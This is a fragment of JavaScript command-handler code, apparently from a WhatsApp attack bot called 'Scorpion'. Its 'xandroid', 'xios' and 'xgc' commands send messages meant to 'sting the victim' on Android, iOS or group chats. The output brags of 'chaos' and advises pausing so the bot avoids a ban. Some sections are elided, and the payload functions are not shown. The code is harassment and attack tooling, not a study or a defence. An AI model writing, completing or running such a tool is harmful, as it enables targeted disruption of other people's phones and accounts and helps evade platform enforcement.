...
case "xandroid": {
  ...
  replygcxeon("please wait, " + command + " Stinging the victim..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully stinged @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that the 𝕾𝖈𝖔𝖗𝖕𝖎𝖔𝖓 is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  ...
  sendMessageWithMentions(
    "Successfully stinged @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nPause 2 minutes so that 𝕾𝖈𝖔𝖗𝖕𝖎𝖔𝖓 is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  ...
  case "xgc":
  {
    ...
    try {
      ...
      await sleep(2500); // Adjusted sleep time for clarity
      replygcxeon("*DONE✅ 𝕾𝖈𝖔𝖗𝖕𝖎𝖔𝖓 HAS brought chaos to your pile of assholes!.*");
